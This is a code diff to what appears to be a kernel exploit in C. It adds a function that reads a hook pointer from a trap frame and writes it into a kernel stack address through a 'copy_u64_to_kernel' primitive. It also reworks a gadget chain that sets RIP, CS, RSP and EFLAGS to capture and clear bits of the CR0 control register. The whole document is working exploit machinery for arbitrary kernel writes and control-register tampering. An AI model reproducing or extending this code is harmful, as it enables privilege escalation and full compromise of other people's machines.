@@ -832,6 +832,22 @@ static int cr0_chain_available(void)
         && (uint64_t)cr0_write_ret > 0x1000;
 }
 
+static int arm_cr0_fast_enter(void)
+{
+    uint64_t hook;
+    uint64_t enter_stack = trap_frame + fpu_cr0_fast_enter_stack_offset;
+    if(copy_from_trap_frame_offset_cached(
+            &hook, fpu_cr0_enter_hook_ptr_offset, sizeof(hook))
+    || (hook >> 48) != 0xffff
+    || copy_u64_to_kernel(hook, enter_stack))
+    {
+        METRIC_INC(cr0_fast_enter_fallbacks);
+        return EFAULT;
+    }
+    METRIC_INC(cr0_fast_enter_arms);
+    return 0;
+}
+
 static int read_cr0_clear_ts_chain_checked(uint64_t* cr0)
 {
     struct cr0_chain_result
@@ -852,19 +868,24 @@ static int read_cr0_clear_ts_chain_checked(uint64_t* cr0)
         return EFAULT;
     }
 
-    uint64_t regs[NREGS] = {
-        [RDI] = trap_frame + fpu_cr0_scratch_offset,
-        [RSI] = trap_frame + fpu_cr0_cleared_offset,
-        [RIP] = (uint64_t)cr0_capture,
-        [CS] = 0x20,
-        [EFLAGS] = 2,
-        [RSP] = trap_frame + fpu_cr0_enter_stack_offset,
-    };
     METRIC_INC(cr0_read_calls);
-    if(run_gadget_no_result_checked(regs))
+    if(!arm_cr0_fast_enter())
+        (void)yield();
+    else
     {
-        METRIC_INC(cr0_chain_failures);
-        return EFAULT;
+        uint64_t regs[NREGS] = {
+            [RDI] = trap_frame + fpu_cr0_scratch_offset,
+            [RSI] = trap_frame + fpu_cr0_cleared_offset,
+            [RIP] = (uint64_t)cr0_capture,
+            [CS] = 0x20,
+            [EFLAGS] = 2,
+            [RSP] = trap_frame + fpu_cr0_enter_stack_offset,
+        };
+        if(run_gadget_no_result_checked(regs))
+        {
+            METRIC_INC(cr0_chain_failures);
+            return EFAULT;
+        }
     }
 
     if(copy_from_trap_frame_offset_cached(&result, fpu_cr0_scratch_offset,
